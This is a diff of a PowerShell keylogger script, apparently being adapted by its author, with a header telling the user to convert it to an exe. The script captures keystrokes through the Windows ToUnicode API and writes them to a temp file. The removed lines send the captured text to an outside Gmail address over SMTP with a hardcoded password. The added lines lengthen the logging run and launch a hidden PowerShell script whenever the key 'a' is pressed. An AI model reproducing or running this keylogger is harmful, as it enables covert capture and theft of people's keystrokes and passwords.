@@ -1,6 +1,9 @@
 ######################################################################
 ## after you modify the information below then convert it to exe file#
 ######################################################################
+function muzikcal {
+Start-Process powershell.exe -windowstyle hidden "C:\Users\batu\Desktop\muzikcal.ps1"
+}
 
 function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
 {
@@ -28,7 +31,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
    #please specify time and default is 20 seconds
     $time = 0
-    while($time -lt 1200) {
+    while($time -lt 36000) {
 
     $time
     $time++
@@ -54,12 +57,23 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
           $mychar = New-Object -TypeName System.Text.StringBuilder
 
           # translate virtual key
-          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
-
+          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0);
+          
           if ($success) 
           {
             # add key to logger file
-            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
+            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode);
+            Start-Sleep -Milliseconds 10;
+            $akdeniz = Get-Content -tail 1 $Path;
+            foreach ($Line in $akdeniz) {
+               $a = $Line.Remove(0, ($Line.Length -1));
+               if ($a -eq "a"){
+                muzikcal
+               }
+               
+                 }
+
+
           }
         }
       }
@@ -67,19 +81,8 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
   }
   finally
   {
-    # please specify your email info
-
-    $data = Get-Content "$Path" 
-    $emailto = 'canarerobertjohn@gmail.com'
-    $email = 'wisincsales@gmail.com'
-    $SMTPServer = 'smtp.gmail.com'
-    $SMTPPort = '587'
-    $Password = 'robertjohn'
-    $subject = 'here is the keys'	
-    $smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort);
-    $smtp.EnableSSL = $true
-    $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $Password);
-    $smtp.Send($email, $emailto, $subject, $data);
+    Start-Sleep –Seconds 5;
+    
     
     
   }
